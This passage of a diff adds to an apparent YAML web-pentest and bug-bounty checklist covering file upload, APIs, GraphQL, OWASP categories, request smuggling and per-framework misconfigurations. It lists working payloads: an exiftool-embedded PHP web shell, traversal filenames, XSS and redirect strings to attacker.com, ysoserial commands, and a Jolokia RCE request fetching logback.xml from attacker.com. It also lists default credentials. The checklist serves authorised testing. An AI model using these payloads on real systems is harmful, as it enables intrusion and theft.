+          - Stack traces / exception details in error responses
+          - Internal IP addresses in response headers or body
+          - DEBUG / verbose logging endpoints left exposed
+          - Source code comments revealing architecture or secrets
+
+  # =========================================================================
+  # SECURITY HEADERS & TRANSPORT
+  # =========================================================================
+  - id: headers
+    type: info
+    title: "Security Headers & Transport Security"
+    content: "Review HTTP response headers for missing or misconfigured protections."
+    children:
+      - id: headers_enumerate
+        type: checklist
+        title: "Enumerate response headers"
+        content: |
+          Read and document all response headers — always useful for understanding the app's defence posture:
+          curl -s -D - https://target.com -o /dev/null
+          Or use securityheaders.com / Mozilla Observatory for a quick visual summary.
+
+          Record which of these are present and note their exact values:
+          - Strict-Transport-Security
+          - Content-Security-Policy
+          - X-Frame-Options
+          - X-Content-Type-Options
+          - Referrer-Policy
+          - Permissions-Policy
+          - Cache-Control on sensitive pages
+          - Server / X-Powered-By (look for version disclosure here)
+
+      - id: headers_check
+        type: checklist
+        title: "Verify security header configuration"
+        scope_tags: [missing_headers]
+        content: |
+          For each header found above, verify it is present and correctly configured:
+          - Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+          - Content-Security-Policy: see headers_csp node below
+          - X-Frame-Options: DENY or SAMEORIGIN (also check CSP frame-ancestors)
+          - X-Content-Type-Options: nosniff
+          - Referrer-Policy: no-referrer or strict-origin-when-cross-origin
+          - Permissions-Policy: restrict camera, microphone, geolocation as appropriate
+          - Cache-Control: no-store on pages containing sensitive user data
+
+      - id: headers_csp
+        type: checklist
+        title: "Content Security Policy (CSP) analysis"
+        content: |
+          Paste the CSP header into: https://csp-evaluator.withgoogle.com/
+
+          Weak CSP indicators:
+          - unsafe-inline in script-src → XSS bypasses CSP entirely
+          - unsafe-eval → allows eval(), setTimeout with string
+          - Wildcard: script-src * or script-src https:
+          - Allowlisted CDNs that host Angular/JSONP: ajax.googleapis.com → CSP bypass
+          - base-uri not set → base tag injection
+
+          CSP bypass techniques:
+          - JSONP endpoints on allowlisted domains
+          - Open redirect on allowlisted domain
+          - Angular/Vue CSP bypasses via allowed CDN scripts
+
+      - id: headers_clickjacking
+        type: checklist
+        title: "Clickjacking"
+        scope_tags: [clickjacking]
+        content: |
+          Check if the page can be embedded in an iframe:
+          <iframe src="https://target.com/account/change-email" width=600 height=600></iframe>
+          If it loads without X-Frame-Options or CSP frame-ancestors → potentially vulnerable.
+
+          High-impact targets for clickjacking:
+          - Password change / email change
+          - Account deletion
+          - Fund transfer
+          - OAuth authorization page
+          - Admin actions
+
+  # =========================================================================
+  # FILE UPLOAD
+  # =========================================================================
+  - id: q_file_upload
+    type: question
+    title: "Does the application have file upload functionality?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: upload_extension_bypass
+            type: checklist
+            title: "Test file extension restrictions"
+            content: |
+              If only certain types are allowed:
+              - Double extension: shell.php.jpg
+              - Null byte (legacy): shell.php%00.jpg
+              - Case variation: shell.PHP, shell.PhP
+              - Alternate PHP: .phtml, .phar, .php5, .php7, .shtml
+              - Server-side scripts: .asp, .aspx, .jsp, .jspx, .cfm
+              - Config files: .htaccess (overrides Apache config if uploaded)
+              - Try modifying Content-Disposition filename
+
+          - id: upload_content_type
+            type: checklist
+            title: "Test Content-Type / magic bytes bypass"
+            content: |
+              - Change Content-Type to image/jpeg while sending PHP shell
+              - Add JPEG magic bytes at start: \xFF\xD8\xFF followed by PHP code
+              - Tools: exiftool to embed PHP in EXIF data
+                exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
+              - Try polyglot files: valid image + PHP code (both magic bytes present)
+              - Check if server validates via magic bytes, extension, or both
+
+          - id: upload_path_traversal_name
+            type: checklist
+            title: "Path traversal via filename"
+            content: |
+              - Filename: ../../../var/www/html/shell.php
+              - Filename: ....//....//shell.php
+              - URL-encoded: ..%2F..%2Fshell.php
+              - Can you overwrite existing files? (../../config.php)
+
+          - id: upload_malicious_content
+            type: checklist
+            title: "Test malicious file content"
+            content: |
+              - SVG with embedded JS: <svg><script>alert(document.domain)</script></svg>
+              - HTML file upload → reflected XSS when served
+              - XML/XLSX → XXE in office document parsers
+              - ZIP slip: zip containing ../../../path/to/shell.php as filename
+              - ImageMagick RCE: MVG or SVG with shell injection (ImageTragick CVE-2016-3714)
+              - PDF with embedded JavaScript (Adobe Reader exploitation)
+              - SSRF via URL-based image imports (test metadata URLs)
+
+          - id: upload_storage
+            type: checklist
+            title: "Test uploaded file storage and access"
+            content: |
+              - Are uploaded files served from the same domain? (XSS risk)
+              - Are executables stored in a web-accessible directory?
+              - Can you directly access uploaded files by guessing the URL?
+              - Is direct access to uploaded files restricted (should not execute server-side)?
+              - Are filenames randomised to prevent enumeration?
+              - Is there a size limit? Can you upload very large files (DoS)?
+
+      - label: "No"
+        key: "no"
+        children: []
+
+  # =========================================================================
+  # API TESTING
+  # =========================================================================
+  - id: q_api
+    type: question
+    title: "Does the application expose an API?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: api_docs
+            type: checklist
+            title: "Check for exposed API documentation"
+            content: |
+              Common paths:
+              /swagger, /swagger-ui, /swagger-ui.html, /swagger.json, /swagger.yaml
+              /api-docs, /api/docs, /openapi.json, /openapi.yaml, /api/swagger
+              /redoc, /docs, /graphql, /graphiql, /playground
+
+              If docs are exposed:
+              - Map ALL endpoints including deprecated ones
+              - Look for endpoints not accessible from the UI
+              - Check if auth is required to access the docs themselves
+              - Note parameter names, types, and example values for targeted fuzzing
+
+          - id: api_rate_limiting
+            type: checklist
+            title: "Test API rate limiting and bypass"
+            content: |
+              - Are requests rate limited per user / per IP?
+              - Test rate limit bypass:
+                - X-Forwarded-For: rotate IPs
+                - X-Real-IP, X-Originating-IP, True-Client-IP
+                - Add extra headers to change the "identity" perceived by the limiter
+
+          - id: api_dos
+            type: checklist
+            title: "Test for resource exhaustion"
+            scope_tags: [dos]
+            content: |
+              - Large payload DoS: send extremely large JSON bodies and observe response time / errors
+              - Expensive query DoS (GraphQL): send deeply nested queries
+                { user { friends { friends { friends { friends { id name } } } } } }
+              - Batch request abuse: send 500 operations in a single GraphQL batch
+              - Long string inputs that trigger expensive regex or parsing
+
+          - id: api_mass_assignment
+            type: checklist
+            title: "Mass assignment / parameter pollution"
+            content: |
+              Try adding undocumented or privileged fields to API request bodies:
+              - "role": "admin"
+              - "isAdmin": true
+              - "verified": true
+              - "balance": 99999
+              - "credits": 999
+              - "group_id": <admin group ID>
+
+              REST: add extra JSON keys to PUT/PATCH requests
+              Frameworks known to be vulnerable if not configured: Rails, Laravel, Spring
+
+          - id: api_verb_tampering
+            type: checklist
+            title: "HTTP verb tampering and method override"
+            content: |
+              - Try PUT, PATCH, DELETE on endpoints that only seem to have GET/POST
+              - Use method override: X-HTTP-Method-Override: DELETE
+              - Use _method=DELETE in form body (Rails, Laravel)
+              - HEAD on sensitive endpoints (returns headers without body, less logging)
+              - OPTIONS to discover allowed methods and CORS policy
+
+          - id: api_versioning
+            type: checklist
+            title: "Test deprecated API versions"
+            content: |
+              - Try /api/v1/ if current is /api/v2/ (may lack newer security controls)
+              - Check for /api/v0/, /api/beta/, /api/internal/
+              - Old versions may lack auth, rate limiting, input validation
+              - Sometimes removals from UI are not reflected in old API versions
+
+          - id: q_graphql
+            type: question
+            title: "Does the API use GraphQL?"
+            options:
+              - label: "Yes"
+                key: "yes"
+                children:
+                  - id: graphql_introspection
+                    type: checklist
+                    title: "GraphQL introspection and schema enumeration"
+                    content: |
+                      Test if introspection is enabled:
+                      {"query": "{__schema{types{name fields{name}}}}"}
+
+                      If blocked, try:
+                      - Disable introspection check bypass: __schema on a fragment
+                      - Field suggestions: send partial queries, error messages reveal fields
+                      - InQL (Burp extension) for automated schema extraction
+                      - graphql-cop for security checks
+
+                  - id: graphql_vulns
+                    type: checklist
+                    title: "GraphQL security testing"
+                    content: |
+                      - Batch query abuse: send many queries in one request to bypass rate limits
+                        [{"query":"..."}, {"query":"..."}, ...]
+                      - Alias overload: many aliased operations in one query
+                      - Query depth attacks: deeply nested queries (DoS)
+                      - Broken object-level auth: access other users' data via nested resolvers
+                      - Field-level auth gaps: sensitive fields on shared types
+                      - Mutation IDOR: mutate.deletePost(id: victim_post_id)
+                      - Inject in variables: {"query": "...", "variables": {"id": "1 OR 1=1"}}
+
+              - label: "No / REST"
+                key: "no"
+                children: []
+
+      - label: "No"
+        key: "no"
+        children: []
+
+  # =========================================================================
+  # OWASP A05 — SECURITY MISCONFIGURATION
+  # =========================================================================
+  - id: misconfig
+    type: info
+    title: "Security Misconfiguration (OWASP A05)"
+    content: "Missing hardening, default configurations, and unnecessary features."
+    children:
+      - id: misconfig_debug
+        type: checklist
+        title: "Debug / development features in production"
+        content: |
+          - Django DEBUG=True: detailed error pages with local variables and settings
+          - Spring Boot Actuator: /actuator/env (environment variables), /actuator/heapdump (heap dump with secrets), /actuator/beans, /actuator/mappings
+          - PHP: expose_php=On, phpinfo() pages accessible
+          - Node.js: --inspect port (9229) accessible
+          - Rails: better_errors gem on production
+          - Verbose error pages revealing stack traces and file paths
+          - /console, /debug, /_debug_toolbar, /profiler endpoints
+
+      - id: misconfig_default
+        type: checklist
+        title: "Default credentials and configurations"
+        content: |
+          Check admin interfaces for default credentials:
+          - Jenkins: admin/admin at /jenkins or /
+          - Grafana: admin/admin
+          - Kibana / Elasticsearch: no auth by default (older versions)
+          - Redis: no auth by default — try redis-cli -h target.com PING
+          - MongoDB: no auth by default — try mongosh target.com
+          - phpMyAdmin: root/(blank)
+          - Tomcat Manager: tomcat/tomcat, admin/admin at /manager/html
+          - JBoss: admin/(blank) at /jmx-console
+          - RabbitMQ management: guest/guest
+          - Hashicorp Vault (dev mode): root token in logs
+
+      - id: misconfig_headers_methods
+        type: checklist
+        title: "Unnecessary HTTP methods and directory listing"
+        content: |
+          Check for dangerous HTTP methods:
+          - OPTIONS → check Allow header for PUT, DELETE, TRACE, CONNECT
+          - TRACE → enable XST (Cross-Site Tracing): sends back HttpOnly cookies?
+          - PUT → WebDAV file upload
+          curl -X OPTIONS https://target.com -v
+
+          Directory listing:
+          - Check if any path returns a directory index (Apache autoindex, nginx autoindex on)
+          - Look for /uploads/, /backup/, /files/, /assets/, /static/
+          - gobuster dir -u https://target.com -w dirs.txt --discover-backup
+
+      - id: misconfig_csrf_debug
+        type: checklist
+        title: "Exposed sensitive files and paths"
+        content: |
+          High-value sensitive paths:
+          - /.git/ → source code disclosure: wget -r https://target.com/.git/
+          - /.svn/, /.hg/, /.bzr/ → VCS metadata
+          - /.env, /.env.local, /.env.production → credentials
+          - /wp-config.php, /config.php, /database.yml, /settings.py
+          - /backup.zip, /backup.tar.gz, /site.tar.gz
+          - /WEB-INF/web.xml (Java), /META-INF/ (Java)
+          - /CHANGELOG, /README, /VERSION → version disclosure
+
+  # =========================================================================
+  # OWASP A06 — VULNERABLE & OUTDATED COMPONENTS
+  # =========================================================================
+  - id: vulncomponents
+    type: info
+    title: "Vulnerable & Outdated Components (OWASP A06)"
+    content: "Identify library versions and cross-reference with known CVEs."
+    children:
+      - id: vulncomponents_identify
+        type: checklist
+        title: "Enumerate component versions"
+        content: |
+          Fingerprint what's running so you can cross-reference against CVE databases:
+          - HTTP headers: Server:, X-Powered-By:, X-Generator:
+          - HTML source: meta generator tags, comment blocks, JS bundle filenames (jquery-3.2.1.min.js)
+          - API error responses: stack traces revealing framework versions
+          - /version, /status, /health, /info, /actuator endpoints
+          - robots.txt, README, CHANGELOG in root
+          - WordPress: /wp-login.php, /wp-content/plugins/, /readme.html
+          - Tools: CMSmap, wpscan, droopescan, whatweb
+
+      - id: vulncomponents_disclosure
+        type: checklist
+        title: "Check for unnecessary version disclosure"
+        scope_tags: [version_disclosure]
+        content: |
+          Report version strings that are exposed with no operational need
+          (a common informational/best-practice finding, often excluded by bug bounty programmes):
+          - Server: header revealing OS and web server version (e.g. Apache/2.4.1 Ubuntu)
+          - X-Powered-By: revealing framework (e.g. PHP/7.4.3, ASP.NET MVC 5.2)
+          - X-Generator: revealing CMS version
+          - Stack traces in error pages revealing library versions
+          - /version or /status endpoints returning detailed build info
+          Hardening: suppress or genericise these headers in server config.
+
+      - id: vulncomponents_check
+        type: checklist
+        title: "Cross-reference versions against CVE databases"
+        content: |
+          Tools:
+          - retire.js: scan JS files for known vulnerable libraries
+          - npm audit / snyk for Node.js (if package.json accessible)
+          - OWASP Dependency-Check
+
+          Databases:
+          - NVD: https://nvd.nist.gov/vuln/search
+          - Exploit-DB: https://www.exploit-db.com/
+          - Snyk Advisor: https://snyk.io/advisor/
+
+          High-value targets to check:
+          - Apache Struts (RCE history: CVE-2017-5638, CVE-2018-11776)
+          - Apache Log4j (Log4Shell CVE-2021-44228)
+          - Spring Framework (Spring4Shell CVE-2022-22965)
+          - jQuery < 3.5.0 (XSS via $.parseHTML)
+          - OpenSSL (Heartbleed CVE-2014-0160 — historical but still found)
+          - libssl / TLS libraries (DROWN, POODLE)
+
+  # =========================================================================
+  # OWASP A08 — SOFTWARE AND DATA INTEGRITY FAILURES
+  # =========================================================================
+  - id: integrity
+    type: info
+    title: "Software & Data Integrity Failures (OWASP A08)"
+    content: "Insecure deserialization, CI/CD pipeline integrity, and CDN subresource integrity."
+    children:
+      - id: integrity_deserialization
+        type: checklist
+        title: "Insecure deserialization"
+        content: |
+          Look for serialized objects in: cookies, hidden form fields, POST bodies, API responses.
+
+          Java serialization: starts with \xAC\xED\x00\x05 (hex: aced0005) or rO0AB in base64
+          - ysoserial: java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
+          - Test via Burp's Java Deserialization Scanner plugin
+
+          PHP serialization: O:4:"User":2:{s:4:"name"...}
+          - Look for PHP object injection in cookies / hidden fields
+          - Test with known gadget chains for popular frameworks
+
+          Python pickle: dangerous if user data deserialized
+          - Craft malicious pickle: os.system("whoami")
+
+          .NET ViewState:
+          - Is ViewState MAC validation disabled?
+          - Can you forge a ViewState with a known machineKey?
+          - Look for machineKey in web.config disclosure
+
+      - id: integrity_cdn
+        type: checklist
+        title: "Subresource integrity and CDN security"
+        content: |
+          - Do script/link tags loading from CDNs have integrity= attributes?
+            <script src="https://cdn.example.com/lib.js" integrity="sha384-..." crossorigin="anonymous">
+          - Missing SRI on external scripts = supply chain attack risk
+          - Check if the CDN URL is predictable or if an older version is loaded
+          - Test if the CDN allows file upload (e.g., CDNs that serve user content)
+
+  # =========================================================================
+  # OWASP A09 — LOGGING & MONITORING FAILURES
+  # =========================================================================
+  - id: logging
+    type: info
+    title: "Logging & Monitoring Failures (OWASP A09)"
+    content: "Verify that security-relevant events are logged and alerting is in place."
+    children:
+      - id: logging_audit
+        type: checklist
+        title: "Verify security event logging"
+        content: |
+          Perform the following and check if they are logged / alerted:
+          - Failed login attempts (especially repeated failures)
+          - Successful login from a new IP/device
+          - Account lockout triggers
+          - Privilege change (role elevation)
+          - Sensitive data access (export, download PII)
+          - Configuration changes
+          - Multiple IDOR attempts (access to other users' objects)
+          - Password changes / MFA changes
+          - Admin panel access
+
+      - id: logging_verbosity
+        type: checklist
+        title: "Check for sensitive data in logs / responses"
+        content: |
+          - Do error responses reveal internal paths, stack traces, or queries?
+          - Are passwords logged during login failures? (should never be)
+          - Are API keys or tokens included in log messages?
+          - Are server logs accessible at /logs/, /log/, /var/log/ via traversal?
+          - Do debug endpoints (/actuator/logfile, /logs) expose log contents?
+
+  # =========================================================================
+  # BUSINESS LOGIC (OWASP A04 — INSECURE DESIGN)
+  # =========================================================================
+  - id: business_logic
+    type: info
+    title: "Business Logic Flaws (OWASP A04)"
+    content: "Application-specific workflow flaws that automated scanners typically miss."
+    children:
+      - id: bl_negative_values
+        type: checklist
+        title: "Test numeric edge cases"
+        content: |
+          In any quantity, price, or numeric field:
+          - Set quantity/amount to 0 → free purchase?
+          - Set to negative → negative charge / credit to account?
+          - Integer overflow: 2147483647 + 1 wraps to negative
+          - Float precision: 0.1 + 0.2 ≠ 0.3 — exploit rounding in financial calculations
+          - Very large values → server-side overflow or DoS
+
+      - id: bl_workflow_bypass
+        type: checklist
+        title: "Multi-step workflow bypass"
+        content: |
+          In multi-step flows (checkout, password reset, MFA, registration):
+          - Skip steps by jumping directly to later endpoints
+          - Replay step N after completing step N+1
+          - Reuse single-use tokens (password reset token, email verification)
+          - Complete step 1 as User A, switch session, complete later steps as User B
+          - Manipulate order IDs or cart IDs between steps
+
+      - id: bl_race_conditions
+        type: checklist
+        title: "Race conditions (TOCTOU)"
+        content: |
+          Find operations that should happen exactly once:
+          - Coupon / promo code redemption
+          - Fund transfer / withdrawal
+          - Vote / like / reaction
+          - Email verification / account activation
+          - API key generation
+
+          Testing:
+          - Send 20-50 identical requests simultaneously (Burp Turbo Intruder / ffuf -rate)
+          - Turbo Intruder "race.py" template
+          - Look for duplicate credits, multiple redemptions, negative balances
+          - HTTP/2 single-packet attack: batch all requests in one TCP packet
+
+      - id: bl_price_manipulation
+        type: checklist
+        title: "Price and discount manipulation"
+        content: |
+          - Change price parameter in checkout request (if client-side)
+          - Apply multiple coupon codes (single-use codes applied in parallel)
+          - Add an item, apply a percentage discount, then add more items
+          - Test currency confusion: send price in different currency
+          - Free trial abuse: create new accounts to reset free trial
+          - Referral bonus abuse: self-referral, circular referrals
+
+      - id: bl_account_lifecycle
+        type: checklist
+        title: "Account lifecycle edge cases"
+        content: |
+          - After account deletion: can the deleted account's data be accessed?
+          - After account deletion: can an old session still be used?
+          - Email change: does the old email receive a notification/confirmation?
+          - Email change: is the new email verified before taking effect?
+          - Can you take over an account by registering with a variant email? (user+tag@, USER@, user @)
+          - Account merging: if the app supports social login, can you merge accounts?
+
+  # =========================================================================
+  # COMMON BUG BOUNTY FINDINGS
+  # =========================================================================
+  - id: bugbounty
+    type: info
+    title: "Common Bug Bounty Findings"
+    content: "High-signal checks for the most commonly rewarded vulnerability classes."
+    children:
+      - id: bb_subdomain_takeover
+        type: checklist
+        title: "Subdomain takeover"
+        content: |
+          From subdomain enumeration, check each CNAME:
+          dig CNAME sub.target.com
+
+          If CNAME points to a third-party service that can be claimed:
+          - GitHub Pages: *.github.io
+          - Heroku: *.herokuapp.com
+          - Azure: *.azurewebsites.net, *.cloudapp.net
+          - AWS S3: *.s3.amazonaws.com, *.s3-website-*.amazonaws.com
+          - Shopify: *.myshopify.com
+          - Fastly, Netlify, Surge.sh, LaunchRock, etc.
+
+          Tooling:
+          - subjack -w subdomains.txt -ssl -o results.txt
+          - nuclei -t takeovers/ -l subdomains.txt
+          - can-i-take-over-xyz (GitHub repository for reference)
+
+          If service is claimable:
+          - Register/claim the service and host a PoC page
+          - Capture cookies shared under the parent domain
+
+      - id: bb_open_redirect
+        type: checklist
+        title: "Open redirect"
+        scope_tags: [open_redirect]
+        content: |
+          Look for redirect parameters: ?next=, ?redirect=, ?url=, ?return=, ?goto=, ?continue=, ?target=, ?redir=
+
+          Payloads:
+          - https://attacker.com
+          - //attacker.com (protocol-relative)
+          - \/\/attacker.com
+          - https:attacker.com
+          - javascript:alert(1)
+          - https://target.com@attacker.com
+          - https://attacker.com/..%2F..%2F
+
+          Also look for:
+          - OAuth redirect_uri open redirect (chain to token theft)
+          - Password reset link that uses redirect param
+          - Post-logout redirect
+          - Post-payment / post-checkout redirect
+
+      - id: bb_host_header
+        type: checklist
+        title: "Host header injection"
+        content: |
+          Send requests with a manipulated Host header:
+          Host: attacker.com
+          Or add extra Host-related headers:
+          X-Forwarded-Host: attacker.com
+          X-Host: attacker.com
+          X-Forwarded-Server: attacker.com
+
+          Impacts to look for:
+          - Password reset email contains attacker.com in the reset link
+          - Cache poisoning: poison the cache with a reflected attacker-controlled Host
+          - Server-side routing to unexpected virtual hosts
+          - Web cache deception via Host header
+
+      - id: bb_cache_poisoning
+        type: checklist
+        title: "Web cache poisoning"
+        content: |
+          Identify unkeyed inputs that affect the response:
+          - X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
+          - Unkeyed query parameters
+          - Vary header analysis
+
+          Steps:
+          1. Add a cache-buster parameter (?cb=uniquevalue) to avoid polluting cache
+          2. Inject attacker-controlled value into an unkeyed header
+          3. Check if the poisoned response is cached (X-Cache: HIT)
+          4. Remove the cache-buster and verify the attack is served to other users
+
+          Tools: Param Miner (Burp extension) for automated unkeyed parameter discovery
+
+      - id: bb_request_smuggling
+        type: checklist
+        title: "HTTP request smuggling"
+        content: |
+          Applicable when there is a front-end proxy (CDN, load balancer) forwarding to a back-end.
+
+          CL.TE (Content-Length used by front-end, Transfer-Encoding by back-end):
+          POST / HTTP/1.1
+          Content-Length: 13
+          Transfer-Encoding: chunked
+
+          0
+
+          SMUGGLED
+
+          TE.CL (opposite): chunk size discrepancy.
+          TE.TE: obfuscate Transfer-Encoding: Transfer-Encoding: xchunked
+
+          Tools:
+          - HTTP Request Smuggler (Burp extension) — automated detection
+          - smuggler.py for manual testing
+
+          High-impact scenarios:
+          - Bypass security controls (auth, rate limiting) applied by front-end
+          - Capture other users' requests (poison the pipeline)
+          - XSS via reflected body of smuggled request
+
+      - id: bb_2fa_bypass
+        type: checklist
+        title: "2FA / MFA bypass"
+        content: |
+          - Skip the 2FA step entirely: after first factor, navigate directly to /dashboard
+          - Response manipulation: intercept the 2FA validation response, change 200 "false" to "true"
+          - Code brute-force: if no rate limiting on the OTP endpoint (6-digit = 1 million possibilities)
+          - Code reuse: does a used OTP remain valid? Try submitting it again
+          - Backup code brute-force: are they longer / more complex than OTP?
+          - Token leakage: is the 2FA code sent in the response body or a header?
+          - Login CSRF: force victim to authenticate with attacker's credentials, capture their data
+
+      - id: bb_account_takeover_chains
+        type: checklist
+        title: "Account takeover vulnerability chains"
+        content: |
+          Common ATO chains worth testing:
+          - Password reset + open redirect → poisoned reset link
+          - OAuth + redirect_uri bypass → code/token interception
+          - CSRF on email change → then password reset to that email
+          - XSS → steal session cookie → session hijacking
+          - Host header injection → password reset poisoning
+          - IDOR on account settings (change email/password of another user)
+          - Race condition on account creation → conflate two accounts
+
+  # =========================================================================
+  # TECH STACK — WEB SERVER
+  # =========================================================================
+  - id: q_webserver
+    type: question
+    title: "What is the primary web / reverse-proxy server?"
+    options:
+      - label: "Nginx"
+        key: "nginx"
+        children:
+          - id: nginx_misconfig
+            type: checklist
+            title: "Nginx security misconfiguration checks"
+            content: |
+              Alias path traversal (alias LFI):
+              If config has: location /files/ { alias /data/; }
+              Try: GET /files../etc/passwd → may resolve to /data/../etc/passwd
+
+              Common Nginx misconfigs:
+              - autoindex on → directory listing
+              - server_tokens on → version disclosure (check Server: header)
+              - add_header not inheriting in nested blocks (common CSP bypass)
+              - Misconfigured proxy_pass: trailing slash differences
+                location /api { proxy_pass http://backend; } vs
+                location /api { proxy_pass http://backend/; }
+              - off-by-slash SSRF: /api../internal
+              - try_files directive bypassing access controls
+
+              Check: nginx -T for config (if you have access in pentest)
+              Nuclei: nuclei -t nginx/ -u https://target.com
+
+      - label: "Apache"
+        key: "apache"
+        children:
+          - id: apache_misconfig
+            type: checklist
+            title: "Apache security misconfiguration checks"
+            content: |
+              - mod_status at /server-status — internal server stats
+              - mod_info at /server-info — module configuration
+              - Trace enabled: curl -X TRACE https://target.com (XST)
+              - .htaccess exposure: GET /.htaccess — should 403 / 404
+              - Directory listing: Options +Indexes in .htaccess
+              - ETags leaking inode numbers (historical, less relevant now)
+              - Apache version in Server: header
+              - WebDAV enabled (check OPTIONS: PROPFIND, PUT methods)
+              - mod_proxy open proxy: CONNECT method to internal hosts
+
+      - label: "IIS"
+        key: "iis"
+        children:
+          - id: iis_misconfig
+            type: checklist
+            title: "IIS security misconfiguration checks"
+            content: |
+              - WebDAV enabled: PROPFIND, PUT, MKCOL methods via OPTIONS
+              - IIS version disclosure in Server: header
+              - ASP.NET trace.axd: /trace.axd → request details including session tokens
+              - Elmah.axd: /elmah.axd → error log with sensitive data
+              - WebResource.axd / ScriptResource.axd (if misconfigured)
+              - *.config handler bypass: IIS sometimes misconfigured to serve web.config
+              - Short filename (8.3) enumeration: GET /aspx~1/ (legacy, Windows)
+              - IIS PUT method allowed (can upload files in WebDAV)
+              - ViewState without MAC validation (see deserialization section)
+
+      - label: "Other / Unknown"
+        key: "other"
+        children:
+          - id: webserver_generic
+            type: checklist
+            title: "Generic web server checks"
+            content: |
+              - Identify server via Server: header and error pages
+              - Search NVD for the identified version
+              - Run nuclei -t exposures/ -t misconfiguration/ against the target
+              - Check for default error pages revealing the server identity
+
+  # =========================================================================
+  # TECH STACK — BACKEND FRAMEWORK
+  # =========================================================================
+  - id: q_backend
+    type: question
+    title: "What is the primary backend framework / language?"
+    options:
+      - label: "Spring Boot (Java)"
+        key: "springboot"
+        children:
+          - id: springboot_actuator
+            type: checklist
+            title: "Spring Boot Actuator exposure"
+            content: |
+              Enumerate actuator endpoints:
+              /actuator → lists all enabled endpoints
+              /actuator/env → ALL environment variables (includes passwords, keys)
+              /actuator/heapdump → download full JVM heap (extract creds with jmap/strings)
+              /actuator/threaddump → thread state
+              /actuator/logfile → application log
+              /actuator/beans → all Spring beans
+              /actuator/mappings → all URL routes
+              /actuator/httptrace → last 100 HTTP requests
+              /actuator/jolokia → JMX over HTTP → potential RCE
+              /actuator/gateway/routes → Spring Cloud Gateway routes
+
+              Jolokia RCE:
+              POST /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml
+
+          - id: springboot_misc
+            type: checklist
+            title: "Spring Boot / Spring Security misconfiguration"
+            content: |
+              - H2 console exposed: /h2-console (dev database, often unauthenticated)
+              - Spring Security debug filter leaking info
+              - CSRF disabled globally (@EnableWebSecurity with csrf().disable())
+              - Spring EL injection in SpEL expressions (SSTI section)
+              - Whitelabel error page revealing stack traces
+
+      - label: "Node.js / Express"
+        key: "nodejs"
+        children:
+          - id: nodejs_misc
+            type: checklist
+            title: "Node.js / Express misconfiguration"
+            content: |
+              - Prototype pollution: inject __proto__: {"isAdmin": true} in JSON body or query params
+                Test: /?__proto__[isAdmin]=true or {"__proto__": {"admin": true}}
+              - Path traversal via static file serving (express.static misconfiguration)
+              - Debug port exposed: node --inspect (port 9229) → RCE via WebSocket
+              - npm packages: check package.json for outdated or vulnerable deps
+              - process.env values leaking via error messages or /env endpoints
+              - Unhandled promise rejections revealing stack traces
+              - Morgan / Winston logging sensitive data
+              - Template injection: Pug, Handlebars, EJS, Mustache if user input rendered
+
+      - label: "PHP"
+        key: "php"
+        children:
+          - id: php_misc
+            type: checklist
+            title: "PHP misconfiguration and specific attacks"
+            content: |
+              - phpinfo(): /phpinfo.php, /info.php, /test.php
+                Reveals: PHP version, loaded modules, environment variables, upload paths
+              - expose_php = On → version in X-Powered-By header
+              - allow_url_include = On → remote file inclusion (RFI)
+              - register_globals = On (legacy) → variable injection
+              - PHP type juggling: "0e123456" == "0e654321" → true (loose comparison)
+                Test in login: password="0e123456" if MD5 hash starts with 0e
+              - PHP object injection (unserialize with user data — see deserialization)
+              - Dangerous functions: eval, exec, system, passthru, shell_exec, popen
+              - LFI via PHP wrappers: php://filter, php://input, data://
+              - Session file LFI: /var/lib/php/sessions/sess_<PHPSESSID>
+
+      - label: "Django / Flask (Python)"
+        key: "python"
+        children:
+          - id: python_misc
+            type: checklist
+            title: "Django / Flask misconfiguration"
+            content: |
+              Django:
+              - DEBUG=True: full stack traces + settings dump at any 404/500
+              - Django admin at /admin/ — default path, default admin:admin
+              - SECRET_KEY exposed (in .env, GitHub, error pages) → forge session cookies
+              - Django debug toolbar exposed (/djdt/)
+              - Misconfigured ALLOWED_HOSTS: * allows host header injection
+              - SQL injection via raw() or extra() queries with unsanitised input
+
+              Flask:
+              - DEBUG=True + Werkzeug debugger: interactive Python console at /console
+                (PIN bypass technique if PIN known/predictable)
+              - SECRET_KEY hardcoded → forge Flask session cookies (flask-unsign)
+              - SSTI via Jinja2 if templates render user input
+              - Python pickle deserialization in sessions (if ItsDangerous not used)
+
+      - label: "ASP.NET Core (.NET)"
+        key: "dotnet"
+        children:
+          - id: dotnet_misc
+            type: checklist
+            title: "ASP.NET / .NET Core misconfiguration"
+            content: |
+              - Elmah.axd error log at /elmah.axd (old ASP.NET)
+              - trace.axd at /trace.axd — request/response traces
+              - ViewState MAC disabled → forge ViewState for deserialization RCE
+                Check: __VIEWSTATEGENERATOR in page source, test with YSoSerial.Net
+              - .NET Core: appsettings.json / secrets.json accessible
+              - Detailed errors in production (customErrors mode="Off")
+              - Swagger / Swashbuckle left enabled in production
+
+      - label: "Ruby on Rails"
+        key: "rails"
+        children:
+          - id: rails_misc
+            type: checklist
+            title: "Ruby on Rails misconfiguration"
+            content: |
+              - Rails debug page (better_errors) in production: detailed variable dump
+              - Secret_key_base exposed → forge signed cookies (rails-cookie-forger)
+              - Mass assignment with permit! or without strong parameters (attr_accessible legacy)
+              - YAML deserialization: older Rails versions vulnerable to Psych YAML exploits
+              - SQL injection via raw string in ActiveRecord: where("name = '#{params[:name]}'")
+              - Path traversal via send_file with user-controlled path
+              - /rails/info/properties in development → environment info
+
+      - label: "Other / Unknown"
+        key: "other_backend"
+        children:
+          - id: other_backend_generic
+            type: checklist
+            title: "Generic backend checks"
+            content: |
+              - Identify framework via error messages, headers, and file extensions
+              - Search NVD and exploit-db for identified framework version
+              - Run nuclei -t technologies/ for tech-specific checks
+              - Review all error responses for stack trace / version disclosure
+
+  # =========================================================================
+  # TECH STACK — CLOUD & INFRASTRUCTURE
+  # =========================================================================
+  - id: q_cloud
+    type: question
+    title: "Is the application hosted on a cloud platform?"
+    options:
+      - label: "AWS"
+        key: "aws"
+        children:
+          - id: aws_checks
+            type: checklist
+            title: "AWS-specific security checks"
+            content: |
+              S3 bucket access:
+              - aws s3 ls s3://target-bucket --no-sign-request
